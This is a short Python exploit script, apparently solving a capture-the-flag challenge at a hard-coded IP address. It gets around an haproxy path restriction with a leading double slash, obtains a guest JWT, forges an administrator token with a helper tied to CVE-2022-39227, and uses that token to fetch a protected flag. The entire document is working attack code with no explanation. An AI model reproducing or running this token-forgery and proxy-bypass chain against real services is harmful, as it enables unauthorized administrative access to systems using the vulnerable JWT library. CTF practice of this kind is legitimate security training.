import requests
import json
from cve_2022_39227 import fake_token

server = '83.136.255.230'
port = 37324

base_uri = f'http://{server}:{port}/'
get_ticket_endpoint = '/api/v1/get_ticket' # needs the extra "/"" at the beginning to circumvent the haproxy.cfg!
flag_endpoint = 'api/v1/flag'

# Get any valid JWT:
resp = requests.get(base_uri + get_ticket_endpoint)
jwt_guest = json.loads(resp.text)['ticket: ']
print('JWT for guest:', jwt_guest)

# Fake the admin token
jwt_admin = fake_token(jwt_guest, 'role=administrator,user=administrator')

# Get the flag:
resp = requests.get(base_uri + flag_endpoint, headers={'Authorization': jwt_admin})
print('Flag:', json.loads(resp.text)['message'])